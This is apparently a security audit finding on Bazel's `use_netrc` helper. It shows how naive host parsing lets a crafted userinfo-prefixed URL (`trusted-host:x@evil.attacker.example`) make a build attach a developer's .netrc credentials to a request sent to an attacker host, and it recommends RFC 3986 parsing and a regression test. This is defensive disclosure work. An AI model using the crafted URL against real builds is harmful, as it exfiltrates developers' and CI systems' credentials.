### Title
Netrc host parsing in `use_netrc` leaks credentials for a trusted host to an attacker-controlled server via userinfo-prefixed URLs - (File: `tools/build_defs/repo/utils.bzl`)

### Summary
`use_netrc()` derives the "host" to match against a user's `.netrc` file by naively splitting the URL authority component on `/` and then on the first `:`, without accounting for the RFC 3986 `userinfo@host` delimiter. An attacker who can supply any URL that is fetched during a build (an `http_archive`/repository-rule `url`, a `bzlmod` registry source URL, a dependency mirror entry, etc.) can craft that URL so that the text before the first `:` matches a real, credentialed host from the victim's `.netrc`, while the actual connection target (after `@`) is the attacker's server. Bazel's own credential-injection logic then attaches the victim's real login/password for the trusted host to the request, and the request is sent to the attacker's host.

### Finding Description
`use_netrc` computes the auth dict passed to `repository_ctx.download`/`download_and_extract`: [1](#0-0) 

The `host` extraction only strips the path (`split("/")[0]`) and then truncates at the first colon (`split(":")[0]`), which is exactly the syntax used for `userinfo:password@host` in a URL authority. For a URL such as:

`http://internal.corp.example:ignored@evil.attacker.example/payload.tar`

- The real network destination (as resolved by any RFC 3986–compliant URL/URI implementation used for the actual HTTP fetch) is `evil.attacker.example`.
- `use_netrc`'s `host` variable, however, evaluates to `internal.corp.example` (everything before the first `:`), which is looked up in the parsed `.netrc` dict.
- If the victim's `.netrc` (read automatically via `read_user_netrc`/`NETRC` env var, or an explicit `netrc` attribute) has a `machine internal.corp.example` entry with real credentials, those credentials are placed into `auth[url]` as `type: basic` with the victim's real `login`/`password`. [2](#0-1) 

This auth dict is keyed by the literal URL string and passed straight through to the downloader, which will attach the resulting `Authorization: Basic ...` header to the request actually sent to `evil.attacker.example`. `get_auth` shows this logic is invoked automatically (without any opt-in) whenever a repository rule uses `NETRC`/user `.netrc`, for every `http`/`https` URL it is given: [3](#0-2) 

The broken invariant is **credential host-scoping**: `.netrc` entries are meant to be sent only to the exact matching machine, but the parser's failure to treat `@` as the userinfo delimiter allows an attacker-chosen authority string to be misclassified as a trusted host.

### Impact Explanation
Any first-party or third-party dependency specification that is allowed to supply a URL consumed by `http_archive`/`http_file`/custom repository rules using `get_auth`/`use_netrc` (e.g., a malicious module's `urls` list, a compromised mirror configuration, or a malicious Bazel registry entry referenced via bzlmod) can exfiltrate a developer's or CI system's real netrc credentials (for services like internal artifact registries, GitHub, corporate mirrors) to an attacker-controlled host, satisfying "credential exfiltration to an attacker-controlled host."

### Likelihood Explanation
No special privileges are required beyond the ability to publish a URL that ends up in a `urls`/`url` list consumed by a build (a common capability for anyone who can add or influence a dependency entry, mirror list, or registry source). The `.netrc` auto-discovery (`read_user_netrc`, `NETRC` env var) is on by default whenever a repo rule calls `get_auth`, and `http_archive` in `@bazel_tools` uses this helper, so no unusual flags are needed.

### Recommendation
Parse the URL authority component per RFC 3986 (split userinfo from host at the last `@` before extracting the host/port) rather than using naive string splitting on `/` and `:`. Preferably use a vetted URI-parsing routine (mirrored into Starlark logic or delegated to a native helper) so that `host` always reflects the actual network destination, and add a dedicated test in `src/test/shell/bazel/starlark_repository_test.sh` verifying that netrc credentials for `trusted.example` are never attached to a URL such as `http://trusted.example:x@evil.example/file`.

```text
def get_auth(ctx, urls):
    """Utility function to obtain the correct auth dict for a list of urls from .netrc file.

    Support optional netrc and auth_patterns attributes if available.

    Args:
      ctx: The repository context of the repository rule calling this utility
        function.
      urls: the list of urls to read

    Returns:
      the auth dict which can be passed to repository_ctx.download
    """
    if hasattr(ctx.attr, "netrc") and ctx.attr.netrc:
        netrc = read_netrc(ctx, ctx.attr.netrc)
    elif "NETRC" in ctx.os.environ:
        netrc = read_netrc(ctx, ctx.os.environ["NETRC"])
    else:
        netrc = read_user_netrc(ctx)
    auth_patterns = {}
    if hasattr(ctx.attr, "auth_patterns") and ctx.attr.auth_patterns:
        auth_patterns = ctx.attr.auth_patterns
    return use_netrc(netrc, urls, auth_patterns)
```
